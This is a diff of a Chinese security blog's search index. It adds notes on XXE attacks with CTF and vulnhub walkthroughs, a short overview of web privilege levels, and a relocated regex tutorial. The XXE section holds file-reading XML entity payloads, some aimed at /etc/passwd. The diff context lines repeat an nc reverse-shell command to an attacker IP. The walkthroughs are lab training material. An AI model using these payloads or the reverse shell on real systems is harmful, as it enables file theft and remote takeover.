+<h3 id="协议-读文件（绕过）"><a href="#协议-读文件（绕过）" class="headerlink" title="协议-读文件（绕过）"></a>协议-读文件（绕过）</h3><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE-绕过</a></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="xxe-lab-php靶场登录框xml数据传输"><a href="#xxe-lab-php靶场登录框xml数据传输" class="headerlink" title="xxe-lab-php靶场登录框xml数据传输"></a>xxe-lab-php靶场登录框xml数据传输</h3><p>地址：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
+<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>首先是用burp抓取数据包，然后右键<code>Send to Spider</code>，进行爬取</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp1.png" alt="xxe-lab-php-wp1"></p>
+<p>在<code>History</code>中可以看到爬取结果</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp2.png" alt="xxe-lab-php-wp2"></p>
+<p>然后对爬取内容搜索<code>xml</code>关键字</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp3.png" alt="xxe-lab-php-wp3"></p>
+<p>找到可以提交xml的页面</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp4.png" alt="xxe-lab-php-wp4"></p>
+<p>再将数据包发送到Repeater构造恶意xml代码进行攻击</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp5.png" alt="xxe-lab-php-wp5"></p>
+<h3 id="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"><a href="#CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改" class="headerlink" title="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"></a>CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改</h3><p>地址：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>先用burp抓包</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp1.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp1"></p>
+<p>再更改数据请求格式Content-Type的值为application/xml<br>然后POST提交下面的代码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现flag可疑目录，flag应该在<code>/home/ctf/</code>下</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp2.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp2"></p>
+<p>于是修改payload，得到flag值</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp3.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp3"></p>
+<h3 id="vulnhub-xxe-lab-1"><a href="#vulnhub-xxe-lab-1" class="headerlink" title="vulnhub-xxe lab:1"></a>vulnhub-xxe lab:1</h3><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/xxe-lab-1,254/">XXE Lab: 1</a></p>
+<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>先用nmap进行扫描</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp1.png" alt="vulnhub-xxe lab1-wp1"></p>
+<p>结果如下：</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp2.png" alt="vulnhub-xxe lab1-wp2"></p>
+<p>访问后没发现什么，然后用扫描器去扫，发现有robots.txt文件可以访问，并且得到两个有效信息，<code>/xxe/</code>目录和<code>/admin.php</code>文件</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp3.png" alt="vulnhub-xxe lab1-wp3"></p>
+<p>先访问<code>/xxe/</code>，登录抓包，发现发送的是xml格式数据</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp4.png" alt="vulnhub-xxe lab1-wp4"></p>
+<p>将数据包发往<code>Repeater</code>，构造攻击语句发包</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显示<code>xxe.php</code>base64加密后内容</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp5.png" alt="vulnhub-xxe lab1-wp5"></p>
+<p>发送到burp的<code>Send to Decoder</code>去解密</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp6.png" alt="vulnhub-xxe lab1-wp6"></p>
+<p>解密得到，但并没有发现什么有用信息</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp7.png" alt="vulnhub-xxe lab1-wp7"></p>
+<p>想到之前还有一个<code>admin.php</code>文件，于是用payload去读取<code>admin.php</code>，进行相同操作，得到用户名和密码，密码是md5加密的</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用户名：administhebest</span><br><span class="line">密码：<span class="symbol">admin@</span><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>这里登录点要注意，是<code>admin.php</code>文件，我们应访问<code>/xxe/admin.php</code>，登进去后点击Flag</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp8.png" alt="vulnhub-xxe lab1-wp8"></p>
+<p>进去后跳转如下地址</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp9.png" alt="vulnhub-xxe lab1-wp9"></p>
+<p>说明有限制，我们接着用刚才的xxe漏洞去读这个文件<code>flagmeout.php</code></p>
+<p>注意该文件是在站点根部录下<code>./flagmeout.php</code></p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp10.png" alt="vulnhub-xxe lab1-wp10"></p>
+<p>解密后得到，这里是base32加密</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp11.png" alt="vulnhub-xxe lab1-wp11"></p>
+<p>网上查找base32解密后，得到一串base64加密，再解密后得到flag所在目录<code>/etc/flag.php</code></p>
+<p>再利用xxe漏洞去读，并解密</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp12.png" alt="vulnhub-xxe lab1-wp12"></p>
+<p>发现一串认不到的代码，从<code>$</code>符判断应该是php代码，我们找个php在线运行，把代码扔进去跑就行了，得到flag值</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp13.png" alt="vulnhub-xxe lab1-wp13"></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>下载：<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
+<p>文章：<a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
+<h2 id="修复与防御"><a href="#修复与防御" class="headerlink" title="修复与防御"></a>修复与防御</h2><p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1.png" alt="XXE修复与防御"></p>
 ]]></content>
       <categories>
-        <category>权限提升</category>
+        <category>小迪安全-Web渗透测试笔记</category>
       </categories>
       <tags>
         <tag>渗透测试</tag>
-        <tag>提权</tag>
+        <tag>XXE</tag>
+        <tag>XML</tag>
       </tags>
   </entry>
   <entry>
@@ -3136,6 +3651,37 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
+    <title>网站权限后台漏洞获取</title>
+    <url>/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<p><img src="/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/.png" alt="png"></p>
+<p>具体有哪些权限需要掌握</p>
+<ul>
+<li><p>后台权限：（获得方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）</p>
+<p>一般网站或后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件（如后台功能存在文件操作的话也可以操作文件数据）</p>
+</li>
+<li><p>网站权限：（获得方式：以上三种思路获取）</p>
+<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
+</li>
+<li><p>数据库权限：<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄露，也可能是网站权限（webshell）进行的数据库配置文件读取获得</p>
+</li>
+<li><p>接口权限：（邮件，短信，支付，第三方登录）</p>
+<p>后台或网站权限后的获取途径了后台（修改配置信息功能点），网站权限（查看配置文件获取）</p>
+</li>
+<li><p>系统权限</p>
+</li>
+<li><p>域控权限</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>权限提升</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux脏牛内核漏洞&amp;SUID&amp;信息收集</title>
     <url>/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&amp;SUID&amp;%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304131412193.png" alt="image-20220304131412193"></p>
@@ -3436,64 +3982,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>正则表达式</title>
-    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
-<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
-</blockquote>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
-<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
-<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
-</li>
-<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
-</li>
-<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
-</li>
-</ul>
-<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
-<p><code>\w</code>单词，匹配字母、数字、下划线</p>
-<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
-<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
-<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
-<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
-<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
-<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
-<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
-<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
-<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
-<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
-<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
-<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
-<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
-<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
-<p><code>|</code>或者条件</p>
-<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
-<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
-<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
-<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
-<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
-<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
-<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
-<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
-<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
-<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
-<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
-<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
-]]></content>
-      <tags>
-        <tag>正则表达式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>钓鱼浅尝</title>
     <url>/2022/04/01/%E9%92%93%E9%B1%BC/</url>
     <content><![CDATA[<blockquote>
@@ -3584,6 +4072,64 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </categories>
       <tags>
         <tag>社会工程学，钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
+<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
+</blockquote>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
+<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
+<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
+</li>
+<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
+</li>
+<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
+</li>
+</ul>
+<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
+<p><code>\w</code>单词，匹配字母、数字、下划线</p>
+<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
+<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
+<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
+<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
+<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
+<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
+<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
+<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
+<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
+<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
+<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
+<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
+<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
+<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
+<p><code>|</code>或者条件</p>
+<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
+<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
+<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
+<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
+<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
+<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
+<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
+<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
+<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
+<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
+<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
+<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
+]]></content>
+      <tags>
+        <tag>正则表达式</tag>
       </tags>
   </entry>
 </search>
